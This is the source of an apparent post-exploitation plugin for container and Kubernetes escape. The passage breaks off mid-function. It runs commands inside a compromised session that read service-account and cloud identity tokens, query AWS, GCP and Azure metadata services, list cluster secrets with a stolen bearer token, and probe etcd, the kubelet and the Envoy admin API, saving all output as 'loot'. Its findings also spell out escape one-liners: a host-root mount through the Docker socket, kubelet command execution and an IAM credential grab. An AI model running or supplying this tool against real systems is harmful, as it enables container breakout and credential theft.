#!/usr/bin/env python3
"""
NexShell Plugin — Container Escape v2.0 (2026 Edition)
Detect and exploit container/K8s security misconfigurations.

Coverage:
  - Environment detection (Docker/Podman/containerd/LXC/K8s/gVisor/Kata/Firecracker/Wasm)
  - Privileged container detection
  - Docker socket exposure (trivial escape)
  - Dangerous Linux capabilities in containers
  - Writable /proc/sysrq-trigger
  - cgroup v1 release_agent escape
  - Namespace analysis (user/pid/net/mnt)
  - Mounted host paths (/) overlay detection
  - Container runtime breakout paths
  - K8s pod security context misconfigurations
  - Kubernetes API server reachability
  - Service account token privileges
  - Exposed kubelet API (10250)
  - etcd direct access (2379)
  - Admission controller bypass
  - Ephemeral/Debug container abuse
  - Service mesh (Istio/Linkerd) sidecar escape
  - binfmt_misc / core_pattern abuse
  - /proc/1/root, /proc/1/fd access
  - Cloud-native escapes (Fargate, ACI, Cloud Run)
  - CVE-2024-21626, CVE-2024-41110, CVE-2024-23651-3, CVE-2024-10220,
    CVE-2024-45310, CVE-2024-53425, CVE-2023-2640/32629 (Ubuntu OverlayFS)

Usage:
    (NexShell)> plugins run container-escape
    (NexShell)> plugins run container-escape --check-only
    (NexShell)> plugins run container-escape --k8s-only
"""

import re
from core.plugin import NexPlugin


class ContainerEscape(NexPlugin):
    name        = "container-escape"
    description = "Modern container/K8s escape — 2024-2026 CVEs, cloud-native, service mesh"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "linux"
    category    = "privesc"
    mitre_id    = "T1611"

    CHECKS = [
        # ── Environment detection ────────────────────────────────────────────
        ("ls -la /.dockerenv 2>/dev/null",
         "dockerenv", "Docker Env File (/.dockerenv)"),
        ("cat /proc/1/cgroup",
         "cgroup_info", "Cgroup Info (container check)"),
        ("cat /proc/self/cgroup",
         "self_cgroup", "Self Cgroup"),
        ("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'container|kubernetes|docker|podman|ecs|fargate|aci|cloud_run'",
         "container_env_vars", "Container Environment Variables"),
        ("env | grep -iE 'KUBERNETES|DOCKER|CONTAINER|POD_NAME|HOSTNAME|ECS|FARGATE|ACI|CLOUD_RUN|AWS_EXECUTION'",
         "k8s_env", "K8s/Docker/Cloud Environment Variables"),
        ("cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
         "k8s_token", "K8s ServiceAccount Token"),
        ("ls -la /var/run/secrets/eks.amazonaws.com/serviceaccount/token 2>/dev/null",
         "eks_token", "EKS IRSA Token"),
        ("cat /var/run/secrets/azure/tokens/azure-identity-token 2>/dev/null",
         "azure_token", "Azure Workload Identity Token"),
        ("curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null",
         "imds_aws", "AWS IMDS (169.254.169.254)"),
        ("curl -s -m 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null",
         "imds_gcp", "GCP IMDS"),
        ("curl -s -m 2 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null",
         "imds_azure", "Azure IMDS"),

        # ── Runtime version (CVE checks) ─────────────────────────────────────
        ("runc --version 2>/dev/null",
         "runc_version", "runc Version (CVE-2024-21626/2019-5736/2024-10220)"),
        ("containerd --version 2>/dev/null",
         "containerd_version", "containerd Version (CVE-2020-15257/2024-45310)"),
        ("docker version 2>/dev/null | head -5",
         "docker_version", "Docker Version (CVE-2024-41110)"),
        ("buildctl --version 2>/dev/null || buildkitd --version 2>/dev/null",
         "buildkit_version", "BuildKit Version (CVE-2024-23651-3)"),
        ("podman --version 2>/dev/null",
         "podman_version", "Podman Version (CVE-2024-53425)"),
        ("runsc --version 2>/dev/null",
         "gvisor_version", "gVisor (runsc) Version"),
        ("kata-runtime --version 2>/dev/null || kata-collect-data.sh 2>/dev/null | head -5",
         "kata_version", "Kata Containers Version"),
        ("singularity --version 2>/dev/null || apptainer --version 2>/dev/null",
         "singularity_version", "Singularity/Apptainer Version"),

        # ── Privileged / Capabilities ─────────────────────────────────────────
        ("cat /proc/self/status | grep CapEff",
         "cap_effective", "Effective Capabilities (CapEff)"),
        ("cat /proc/self/status | grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)'",
         "all_caps", "All Capabilities"),
        ("capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') 2>/dev/null",
         "cap_decode", "Decoded Capabilities"),
        ("cat /proc/self/status | grep -i 'NoNewPrivs'",
         "no_new_privs", "NoNewPrivileges Flag"),

        # ── Filesystem mounts (host path detection) ──────────────────────────
        ("cat /proc/mounts",
         "proc_mounts", "Mounted Filesystems"),
        ("findmnt 2>/dev/null",
         "findmnt", "Mount Tree"),
        ("ls -la / | head -20",
         "root_listing", "Root Filesystem (host mount check)"),
        ("ls -la /host 2>/dev/null",
         "host_dir", "/host Directory (mounted host /)"),
        ("ls -la /mnt 2>/dev/null",
         "mnt_dir", "/mnt Directory"),

        # ── Docker socket ─────────────────────────────────────────────────────
        ("ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null",
         "docker_sock", "Docker Socket"),
        ("ls -la /var/run/docker/libcontainerd/docker-containerd.sock 2>/dev/null",
         "containerd_sock", "containerd Socket"),
        ("ls -la /run/containerd/containerd.sock 2>/dev/null",
         "containerd_sock2", "containerd Socket (alt)"),
        ("ls -la /run/podman/podman.sock 2>/dev/null",
         "podman_sock", "Podman Socket"),
        ("ls -la /run/crio/crio.sock 2>/dev/null",
         "crio_sock", "CRI-O Socket"),

        # ── cgroup release_agent escape ───────────────────────────────────────
        ("ls -la /sys/fs/cgroup/ 2>/dev/null | head -10",
         "cgroup_v1", "cgroup v1 Filesystem"),
        ("cat /sys/fs/cgroup/release_agent 2>/dev/null",
         "cgroup_release_agent", "cgroup release_agent"),
        ("ls -la /sys/fs/cgroup/memory/release_agent 2>/dev/null",
         "cgroup_memory_ra", "cgroup Memory release_agent"),
        ("ls -la /sys/fs/cgroup/cpu/release_agent 2>/dev/null",
         "cgroup_cpu_ra", "cgroup CPU release_agent"),

        # ── sysrq & kernel params ─────────────────────────────────────────────
        ("ls -la /proc/sysrq-trigger 2>/dev/null",
         "sysrq", "/proc/sysrq-trigger"),
        ("cat /proc/sys/kernel/core_pattern 2>/dev/null",
         "core_pattern", "core_pattern (CVE-2019-5736 indicator)"),
        ("ls -la /proc/sys/fs/binfmt_misc/ 2>/dev/null",
         "binfmt_misc", "binfmt_misc (escape vector)"),
        ("cat /proc/sys/fs/binfmt_misc/status 2>/dev/null",
         "binfmt_status", "binfmt_misc Status"),

        # ── Namespace analysis ────────────────────────────────────────────────
        ("cat /proc/self/ns 2>/dev/null || ls -la /proc/self/ns/ 2>/dev/null",
         "namespaces", "Process Namespaces"),
        ("ls -la /proc/1/ns/ 2>/dev/null",
         "pid1_namespaces", "PID1 Namespaces (host check)"),
        ("unshare --user 2>/dev/null && echo 'user-ns-OK' || echo 'user-ns-denied'",
         "user_ns_test", "User Namespace Creation"),
        ("cat /proc/self/uid_map 2>/dev/null",
         "uid_map", "User Namespace UID Map"),

        # ── /proc/1 access (host leak) ────────────────────────────────────────
        ("ls -la /proc/1/root 2>/dev/null",
         "proc1_root", "/proc/1/root Access"),
        ("ls -la /proc/1/fd 2>/dev/null | head -20",
         "proc1_fd", "/proc/1/fd Access"),
        ("ls -la /proc/1/cwd 2>/dev/null",
         "proc1_cwd", "/proc/1/cwd Access"),
        ("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -20",
         "proc1_environ", "/proc/1/environ Access"),
        ("cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '",
         "proc1_cmdline", "/proc/1/cmdline"),

        # ── Devices ───────────────────────────────────────────────────────────
        ("ls -la /dev/mem /dev/kmem /dev/kcore 2>/dev/null",
         "raw_devices", "Raw Memory Devices"),
        ("ls -la /dev/sda /dev/nvme0n1 /dev/xvda /dev/vda 2>/dev/null",
         "block_devices", "Block Devices"),
        ("ls -la /dev/fuse /dev/loop* /dev/loop-control 2>/dev/null | head -10",
         "fuse_loop", "FUSE/Loop Devices"),
        ("ls -la /dev/net/tun 2>/dev/null",
         "tun_device", "TUN Device"),

        # ── Security modules (Seccomp/AppArmor/SELinux/Landlock) ─────────────
        ("grep -i seccomp /proc/self/status 2>/dev/null",
         "seccomp_status", "Seccomp Status"),
        ("cat /proc/self/status | grep -iE 'Seccomp|Seccomp_filters'",
         "seccomp_filters", "Seccomp Filters"),
        ("cat /proc/self/attr/current 2>/dev/null",
         "apparmor_profile", "AppArmor Profile"),
        ("cat /proc/thread-self/attr/current 2>/dev/null",
         "selinux_context", "SELinux Context"),
        ("ls -la /sys/kernel/security/landlock/ 2>/dev/null",
         "landlock", "Landlock LSM"),

        # ── K8s API access ────────────────────────────────────────────────────
        ("curl -sk https://kubernetes.default.svc/api 2>/dev/null | head -20",
         "k8s_api_anon", "K8s API Anonymous Access"),
        ("curl -sk -H 'Authorization: Bearer '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -20",
         "k8s_namespaces", "K8s Namespaces (with SA token)"),
        ("curl -sk -H 'Authorization: Bearer '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) https://kubernetes.default.svc/api/v1/secrets 2>/dev/null | head -20",
         "k8s_secrets_api", "K8s Secrets (with SA token)"),
        ("kubectl auth can-i --list 2>/dev/null",
         "k8s_rbac", "K8s RBAC: Can-I List"),
        ("kubectl get pods --all-namespaces 2>/dev/null | head -20",
         "k8s_pods", "K8s Pods"),
        ("kubectl auth can-i create pods --all-namespaces 2>/dev/null",
         "k8s_can_create_pods", "K8s Can Create Pods"),
        ("kubectl auth can-i create pods/exec --all-namespaces 2>/dev/null",
         "k8s_can_exec", "K8s Can Exec into Pods"),
        ("kubectl auth can-i create pods/ephemeralcontainers --all-namespaces 2>/dev/null",
         "k8s_can_ephemeral", "K8s Can Create Ephemeral Containers"),
        ("kubectl get nodes -o wide 2>/dev/null",
         "k8s_nodes", "K8s Nodes"),
        ("kubectl auth can-i '*' '*' --all-namespaces 2>/dev/null",
         "k8s_cluster_admin", "K8s Cluster-Admin Check"),

        # ── etcd direct access ────────────────────────────────────────────────
        ("curl -sk https://kubernetes.default.svc:2379/version 2>/dev/null",
         "etcd_api", "etcd API Access"),
        ("ETCDCTL_API=3 etcdctl --endpoints=https://kubernetes.default.svc:2379 get / --prefix --keys-only 2>/dev/null | head -20",
         "etcd_keys", "etcd Keys (with SA token)"),
        ("curl -sk https://kubernetes.default.svc:2379/v3/kv/range -X POST -d '{\"key\":\"L3JlZ2lzdHJ5Lw==\",\"range_end\":\"L3JlZ2lzdHJ5MA==\"}' 2>/dev/null | head -30",
         "etcd_registry", "etcd Registry Access"),

        # ── Admission controllers ─────────────────────────────────────────────
        ("kubectl get mutatingwebhookconfigurations 2>/dev/null",
         "k8s_mutating_webhooks", "K8s Mutating Webhooks"),
        ("kubectl get validatingwebhookconfigurations 2>/dev/null",
         "k8s_validating_webhooks", "K8s Validating Webhooks"),
        ("kubectl get podsecuritypolicies 2>/dev/null || kubectl get pods.podsecuritypolicy 2>/dev/null",
         "k8s_psp", "K8s PodSecurityPolicies"),
        ("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name} {.spec.securityContext} {\"\\n\"}{end}' 2>/dev/null | head -30",
         "k8s_pod_security", "K8s Pod Security Contexts"),

        # ── Kubelet (unauthenticated 10250) ───────────────────────────────────
        ("curl -sk https://localhost:10250/pods 2>/dev/null | head -30",
         "kubelet_pods", "Kubelet /pods (unauthenticated)"),
        ("curl -sk https://localhost:10250/runningpods 2>/dev/null | head -20",
         "kubelet_running", "Kubelet /runningpods"),
        ("curl -sk http://localhost:10255/pods 2>/dev/null | head -20",
         "kubelet_ro", "Kubelet Read-Only API (10255)"),
        ("curl -sk https://localhost:10250/healthz 2>/dev/null",
         "kubelet_healthz", "Kubelet /healthz"),
        ("curl -sk https://localhost:10250/metrics 2>/dev/null | head -20",
         "kubelet_metrics", "Kubelet /metrics"),

        # ── Service mesh (Istio/Linkerd) ──────────────────────────────────────
        ("ls -la /etc/istio/ 2>/dev/null",
         "istio_config", "Istio Config"),
        ("ls -la /var/run/secrets/workload-spiffe-credentials/ 2>/dev/null",
         "istio_spiffe", "Istio SPIFFE Credentials"),
        ("curl -s http://localhost:15000/config_dump 2>/dev/null | head -30",
         "istio_envoy_config", "Istio Envoy Config Dump"),
        ("curl -s http://localhost:15000/help 2>/dev/null",
         "istio_envoy_admin", "Istio Envoy Admin API"),
        ("curl -s http://localhost:15020/healthz/ready 2>/dev/null",
         "istio_ready", "Istio Ready Check"),

        # ── Other container escape vectors ────────────────────────────────────
        ("cat /proc/self/mountinfo | grep 'overlay\\|upperdir'",
         "overlay_mounts", "Overlay Mounts (container layer)"),
        ("fdisk -l 2>/dev/null | head -20",
         "disk_list", "Disk List (host disk access)"),
        ("dmesg 2>/dev/null | head -10",
         "dmesg_access", "dmesg Access (CAP_SYS_ADMIN check)"),
        ("cat /proc/sched_debug 2>/dev/null | head -20",
         "sched_debug", "/proc/sched_debug (info leak)"),
        ("cat /proc/vmcoreinfo 2>/dev/null | head -10",
         "vmcoreinfo", "/proc/vmcoreinfo (kernel info leak)"),
        ("ls -la /sys/kernel/vmcoreinfo 2>/dev/null",
         "sys_vmcoreinfo", "/sys/kernel/vmcoreinfo"),

        # ── Cloud-native escape indicators ────────────────────────────────────
        ("cat /proc/1/sched 2>/dev/null | head -5",
         "pid1_sched", "PID1 Scheduler Info (host check)"),
        ("hostname 2>/dev/null",
         "hostname", "Container Hostname"),
        ("cat /etc/hostname 2>/dev/null",
         "etc_hostname", "/etc/hostname"),
    ]

    # Capability hex values that indicate privilege
    PRIVILEGED_CAPS = {
        0x0000003fffffffff: "FULLY PRIVILEGED (all caps)",
        0x000001ffffffffff: "HIGHLY PRIVILEGED",
    }

    DANGEROUS_CAPS = [
        ('cap_sys_admin',    'Critical', "CAP_SYS_ADMIN in Container",
         "CAP_SYS_ADMIN is a near-root capability. Multiple escape paths: mount host /, cgroup release_agent, overlay fs."),
        ('cap_sys_ptrace',   'High',     "CAP_SYS_PTRACE in Container",
         "CAP_SYS_PTRACE allows process injection into host processes if sharing PID namespace."),
        ('cap_dac_override', 'High',     "CAP_DAC_OVERRIDE in Container",
         "CAP_DAC_OVERRIDE bypasses file permission checks. May read/write host files if mounted."),
        ('cap_setuid',       'High',     "CAP_SETUID in Container",
         "CAP_SETUID allows switching to any UID. Can become root inside container."),
        ('cap_net_admin',    'Medium',   "CAP_NET_ADMIN in Container",
         "CAP_NET_ADMIN allows network interface manipulation. Can sniff traffic, ARP spoof."),
        ('cap_sys_module',   'Critical', "CAP_SYS_MODULE in Container",
         "CAP_SYS_MODULE allows loading kernel modules. Trivial host escape via malicious module."),
        ('cap_sys_rawio',    'High',     "CAP_SYS_RAWIO in Container",
         "CAP_SYS_RAWIO allows raw disk I/O. Can read/write host disk directly."),
        ('cap_net_raw',      'Medium',   "CAP_NET_RAW in Container",
         "CAP_NET_RAW allows raw sockets. Can craft packets, sniff, ARP spoof."),
        ('cap_sys_chroot',   'Medium',   "CAP_SYS_CHROOT in Container",
         "CAP_SYS_CHROOT allows chroot manipulation. Can escape chroot jails."),
        ('cap_audit_write',  'Low',      "CAP_AUDIT_WRITE in Container",
         "CAP_AUDIT_WRITE allows writing to audit log. Can hide malicious activity."),
    ]

    # Known vulnerable runtime versions (2024-2026)
    VULN_RUNTIMES = {
        'runc': [
            ((1, 1, 12), 'CVE-2024-21626', 'Leaky Vessels - workingDir escape', 'Critical'),
            ((1, 1, 13), 'CVE-2024-10220', 'runc container breakout', 'Critical'),
            ((1, 0, 0),  'CVE-2019-5736',  'runc exec overwrite', 'Critical'),
        ],
        'containerd': [
            ((1, 7, 22), 'CVE-2024-45310', 'shim API escape', 'Critical'),
            ((1, 6, 0),  'CVE-2020-15257', 'shim API exposure', 'High'),
        ],
        'docker': [
            ((27, 3, 1), 'CVE-2024-41110', 'AuthZ plugin bypass', 'Critical'),
        ],
        'buildkit': [
            ((0, 16, 0), 'CVE-2024-23651', 'BuildKit secret leak', 'High'),
            ((0, 16, 0), 'CVE-2024-23652', 'BuildKit container breakout', 'Critical'),
            ((0, 16, 0), 'CVE-2024-23653', 'BuildKit arbitrary file read', 'High'),
        ],
        'podman': [
            ((5, 2, 2), 'CVE-2024-53425', 'Podman info leak', 'Medium'),
        ],
    }

    def run(self, session, args: list):
        check_only = '--check-only' in (args or [])
        k8s_only   = '--k8s-only'   in (args or [])
        self.info("Starting container-escape v2.0 (2026 Edition) ...")
        sections  = []
        collected = {}
        findings_created = 0

        # ── Collect data ──────────────────────────────────────────────────────
        for cmd, key, label in self.CHECKS:
            try:
                out = self._exec(session, cmd)
                if not out.strip():
                    continue
                collected[key] = out
                self.loot(out, category='privesc', source=f"container-escape:{key}")
                if not check_only:
                    sections.append(f"\n  [{label}]")
                    sections.append('─'*64)
                    sections.append(out.strip()[:400])
            except Exception as e:
                self.warn(f"Check failed [{label}]: {e}")

        # ── Container detection ───────────────────────────────────────────────
        in_container = False
        container_type = "Unknown"
        container_runtime = "Unknown"

        if collected.get('dockerenv') or re.search(r'docker', collected.get('cgroup_info', ''), re.I):
            in_container   = True
            container_type = "Docker"
            container_runtime = "runc"
        if re.search(r'kubepods', collected.get('cgroup_info', ''), re.I):
            in_container   = True
            container_type = "Kubernetes"
        if re.search(r'lxc', collected.get('cgroup_info', ''), re.I):
            in_container   = True
            container_type = "LXC"
        if re.search(r'gvisor|runsc', collected.get('container_env_vars', ''), re.I):
            in_container   = True
            container_type = "gVisor"
            container_runtime = "runsc"
        if re.search(r'kata', collected.get('container_env_vars', ''), re.I):
            in_container   = True
            container_type = "Kata Containers"
        if re.search(r'fargate|ecs', collected.get('container_env_vars', ''), re.I):
            in_container   = True
            container_type = "AWS Fargate/ECS"
        if re.search(r'aci', collected.get('container_env_vars', ''), re.I):
            in_container   = True
            container_type = "Azure Container Instances"
        if re.search(r'cloud_run', collected.get('container_env_vars', ''), re.I):
            in_container   = True
            container_type = "GCP Cloud Run"
        if re.search(r'singularity|apptainer', collected.get('container_env_vars', ''), re.I):
            in_container   = True
            container_type = "Singularity/Apptainer"

        if in_container:
            sections.insert(0, f"[!] Running INSIDE {container_type} container (runtime: {container_runtime})")
        else:
            sections.insert(0, "[*] Does not appear to be inside a container — running on host")

        # ── Capability analysis ───────────────────────────────────────────────
        cap_text = collected.get('cap_decode', '') or collected.get('all_caps', '')
        for cap, severity, title, recommendation in self.DANGEROUS_CAPS:
            if re.search(cap, cap_text, re.I):
                self.finding(
                    title          = title,
                    description    = f"Detected capability: {cap}\n\nCapability output:\n{cap_text[:300]}",
                    severity       = severity,
                    recommendation = recommendation,
                    mitre_id       = self.mitre_id,
                )
                self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                findings_created += 1

        # Check for all-capabilities (privileged container)
        cap_eff_line = collected.get('cap_effective', '')
        cap_match = re.search(r'CapEff:\s*([0-9a-fA-F]+)', cap_eff_line)
        if cap_match:
            cap_val = int(cap_match.group(1), 16)
            if cap_val == 0x0000003fffffffff or cap_val >= 0x000001ffffffffff:
                self.finding(
                    title          = "Privileged Container Detected (All Capabilities)",
                    description    = f"CapEff: {hex(cap_val)} — container is running with all capabilities. Trivial host escape.",
                    severity       = "Critical",
                    recommendation = "Never run --privileged in production. Use specific capabilities with --cap-add. Apply Pod Security Standards (restricted profile).",
                    mitre_id       = self.mitre_id,
                )
                findings_created += 1

        # ── Docker socket ─────────────────────────────────────────────────────
        docker_sock = collected.get('docker_sock', '')
        if docker_sock.strip() and 'No such' not in docker_sock:
            self.finding(
                title          = "Docker Socket Mounted in Container",
                description    = f"Docker socket accessible from within container.\n{docker_sock}\n\nEscape: docker run -v /:/host --rm -it alpine chroot /host sh",
                severity       = "Critical",
                recommendation = "Never mount docker.sock into containers. If needed, use a socket proxy with restricted permissions.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── cgroup v1 release_agent escape ────────────────────────────────────
        cg_ra = collected.get('cgroup_release_agent', '') or collected.get('cgroup_memory_ra', '')
        if cg_ra.strip():
            if in_container and re.search(r'cap_sys_admin', cap_text, re.I):
                self.finding(
                    title          = "cgroup v1 release_agent Escape Possible",
                    description    = "Container has CAP_SYS_ADMIN + cgroup v1 filesystem accessible.\n\nEscape: mount cgroup v1, write /exploit.sh to release_agent, trigger with memory.max_mem",
                    severity       = "Critical",
                    recommendation = "Use cgroup v2 (cgroupns). Remove CAP_SYS_ADMIN. Apply seccomp profile. Use Pod Security Standards (restricted).",
                    mitre_id       = self.mitre_id,
                )
                findings_created += 1

        # ── Host / disk device access ─────────────────────────────────────────
        if collected.get('block_devices', '').strip():
            self.finding(
                title          = "Block Devices Accessible from Container",
                description    = collected.get('block_devices', '')[:300],
                severity       = "Critical",
                recommendation = "Direct disk access allows reading/modifying host filesystem. Never expose /dev/sda or raw disks to containers.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── Mounted host paths ────────────────────────────────────────────────
        mounts = collected.get('proc_mounts', '')
        if re.search(r'\s+/\s+.*rw', mounts):
            self.finding(
                title          = "Host Root Filesystem Mounted Read-Write",
                description    = "Host '/' mounted read-write into container. Full host filesystem access.",
                severity       = "Critical",
                recommendation = "Never mount host / into containers. If needed, use read-only (ro) mounts of specific directories.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── /proc/1 access (host leak) ────────────────────────────────────────
        if collected.get('proc1_root', '').strip() and 'No such' not in collected.get('proc1_root', ''):
            self.finding(
                title          = "/proc/1/root Accessible (Host Filesystem Leak)",
                description    = "Container can access /proc/1/root — may expose host filesystem.\n\n" + collected.get('proc1_root', '')[:200],
                severity       = "High",
                recommendation = "Restrict /proc access via maskedPaths and readonlyPaths in container runtime config.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── binfmt_misc escape ────────────────────────────────────────────────
        if collected.get('binfmt_misc', '').strip() and 'No such' not in collected.get('binfmt_misc', ''):
            binfmt_status = collected.get('binfmt_status', '')
            if 'enabled' in binfmt_status.lower():
                self.finding(
                    title          = "binfmt_misc Enabled (Escape Vector)",
                    description    = "binfmt_misc is enabled — can register custom binary formats to execute arbitrary code on host.",
                    severity       = "High",
                    recommendation = "Disable binfmt_misc in container: --security-opt systempaths=unconfined or mask /proc/sys/fs/binfmt_misc.",
                    mitre_id       = self.mitre_id,
                )
                findings_created += 1

        # ── core_pattern abuse ────────────────────────────────────────────────
        core_pattern = collected.get('core_pattern', '')
        if core_pattern.strip() and '|' in core_pattern:
            self.finding(
                title          = "core_pattern Pipe Detected (Escape Vector)",
                description    = f"core_pattern uses pipe: {core_pattern}\n\nCan be abused to execute arbitrary commands on core dump.",
                severity       = "High",
                recommendation = "Restrict /proc/sys/kernel/core_pattern access. Use seccomp to block writes.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── Seccomp disabled ──────────────────────────────────────────────────
        seccomp = collected.get('seccomp_status', '')
        if 'Seccomp:\t0' in seccomp:
            self.finding(
                title          = "Seccomp Disabled in Container",
                description    = "No seccomp profile applied — container can use any syscall.",
                severity       = "Medium",
                recommendation = "Apply seccomp profile: docker run --security-opt seccomp=default.json or use Pod Security Standards.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── AppArmor unconfined ───────────────────────────────────────────────
        apparmor = collected.get('apparmor_profile', '')
        if 'unconfined' in apparmor.lower():
            self.finding(
                title          = "AppArmor Unconfined in Container",
                description    = "Container running without AppArmor profile — no MAC protection.",
                severity       = "Medium",
                recommendation = "Apply AppArmor profile: docker run --security-opt apparmor=docker-default.",
                mitre_id       = self.mitre_id,
            )
            findings_created += 1

        # ── K8s API anonymous access ──────────────────────────────────────────
        k8s_api = collected.get('k8s_api_anon', '')
        if '"versions"' in k8s_api or '"groups"' in k8s_api:
            self.finding(
                title          = "K8s API Server Anonymously Accessible",
                description    = k8s_api[:300],
                severity       = "High",
                recommendation = "Disable anonymous authentication: --anonymous-auth=false in kube-apiserver flags.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── Kubelet unauthenticated ────────────────────────────────────────────
        if collected.get('kubelet_pods', '').strip() and 'Connection refused' not in collected.get('kubelet_pods', ''):
            self.finding(
                title          = "Kubelet API Unauthenticated (Port 10250)",
                description    = "Kubelet /pods endpoint accessible without authentication.\n\nExploit: curl -sk https://node:10250/run/<ns>/<pod>/<container> -d 'cmd=id'",
                severity       = "Critical",
                recommendation = "Enable kubelet authentication: --authentication-token-webhook=true and --authorization-mode=Webhook. Firewall port 10250.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── K8s cluster-admin check ───────────────────────────────────────────
        if 'yes' in collected.get('k8s_cluster_admin', '').lower():
            self.finding(
                title          = "K8s ServiceAccount has Cluster-Admin",
                description    = "Service account has full cluster-admin privileges.\n\nCan create privileged pods, access all secrets, escape to node.",
                severity       = "Critical",
                recommendation = "Apply least privilege RBAC. Never bind cluster-admin to service accounts. Use Pod Security Admission.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── K8s can create pods/exec ──────────────────────────────────────────
        if 'yes' in collected.get('k8s_can_exec', '').lower():
            self.finding(
                title          = "K8s Can Exec into Pods (Lateral Movement)",
                description    = "Service account can exec into other pods — lateral movement across namespaces.",
                severity       = "High",
                recommendation = "Restrict pods/exec permission. Use network policies to isolate workloads.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── K8s can create ephemeral containers ───────────────────────────────
        if 'yes' in collected.get('k8s_can_ephemeral', '').lower():
            self.finding(
                title          = "K8s Can Create Ephemeral Containers (Debug)",
                description    = "Service account can create ephemeral/debug containers — can inject into running pods.",
                severity       = "High",
                recommendation = "Restrict pods/ephemeralcontainers permission. Use Pod Security Admission (restricted profile).",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── etcd direct access ────────────────────────────────────────────────
        if collected.get('etcd_api', '').strip() and '"etcdserver"' in collected.get('etcd_api', ''):
            self.finding(
                title          = "etcd Directly Accessible",
                description    = "etcd API is accessible — can read/write all K8s state including secrets.",
                severity       = "Critical",
                recommendation = "Restrict etcd access via network policies. Enable mTLS for etcd. Never expose etcd to pods.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── Istio Envoy admin API ─────────────────────────────────────────────
        if collected.get('istio_envoy_admin', '').strip() and 'help' in collected.get('istio_envoy_admin', '').lower():
            self.finding(
                title          = "Istio Envoy Admin API Exposed",
                description    = "Istio Envoy admin API accessible on port 15000 — can dump config, certs, and secrets.",
                severity       = "High",
                recommendation = "Disable Envoy admin API or restrict to localhost. Use bootstrap config to disable admin interface.",
                mitre_id       = "T1613",
            )
            findings_created += 1

        # ── Cloud IMDS access ─────────────────────────────────────────────────
        if collected.get('imds_aws', '').strip() and 'ami-id' in collected.get('imds_aws', ''):
            self.finding(
                title          = "AWS IMDS Accessible from Container",
                description    = "AWS Instance Metadata Service accessible — can steal IAM role credentials.\n\nExploit: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                severity       = "Critical",
                recommendation = "Use IMDSv2 only (require token). Block 169.254.169.254 from pods via network policies. Use IRSA for EKS.",
                mitre_id       = "T1552.005",
            )
            findings_created += 1

        if collected.get('imds_gcp', '').strip() and 'computeMetadata' in collected.get('imds_gcp', ''):
            self.finding(
                title          = "GCP IMDS Accessible from Container",
                description    = "GCP Metadata server accessible — can steal service account tokens.",
                severity       = "Critical",
                recommendation = "Use Workload Identity instead of metadata server. Block metadata IP from pods.",
                mitre_id       = "T1552.005",
            )
            findings_created += 1

        # ── Runtime CVE checks ────────────────────────────────────────────────
        for runtime_name, vulns in self.VULN_RUNTIMES.items():
            version_key = f"{runtime_name}_version"
            version_text = collected.get(version_key, '')
            if not version_text:
                continue
            version_match = re.search(r'(\d+)\.(\d+)\.(\d+)', version_text)
            if not version_match:
                continue
            major, minor, patch_v = int(version_match.group(1)), int(version_match.group(2)), int(version_match.group(3))
            for min_version, cve, description, severity in vulns:
                if (major, minor, patch_v) < min_version:
                    self.finding(
                        title          = f"Vulnerable {runtime_name} Version: {version_text.strip()} ({cve})",
                        description    = f"{runtime_name} version vulnerable to {cve}: {description}",
                        severity       = severity,
                        recommendation = f"Upgrade {runtime_name} to >= {'.'.join(map(str, min_version))}. Apply {cve} patches.",
                        mitre_id       = self.mitre_id,
                    )
                    findings_created += 1
                    break  # Only report the most critical CVE per runtime

        # ── Ubuntu OverlayFS CVE-2023-2640/32629 ──────────────────────────────
        if in_container:
            os_check = self._exec(session, "cat /etc/os-release 2>/dev/null | grep -i ubuntu")
            if 'ubuntu' in os_check.lower():
                kernel = self._exec(session, "uname -r 2>/dev/null")
                if re.search(r'5\.(15|19)\.', kernel):
                    self.finding(
                        title          = "Ubuntu OverlayFS LPE Possible (CVE-2023-2640/32629)",
                        description    = f"Ubuntu kernel {kernel.strip()} vulnerable to OverlayFS LPE (AlienCrash/Brand new).",
                        severity       = "Critical",
                        recommendation = "Patch kernel immediately. Ubuntu 5.15.0-83+ and 5.19.0-46+ are fixed.",
                        mitre_id       = self.mitre_id,
                    )
                    findings_created += 1

        # ── Escape path summary ───────────────────────────────────────────────
        escape_paths = []
        if collected.get('docker_sock', '').strip() and 'No such' not in collected.get('docker_sock', ''):
            escape_paths.append("Docker socket → docker run -v /:/host → chroot /host")
        if re.search(r'cap_sys_admin', cap_text, re.I) and cg_ra.strip():
            escape_paths.append("CAP_SYS_ADMIN + cgroup v1 → release_agent write → host command execution")
        if collected.get('block_devices', '').strip():
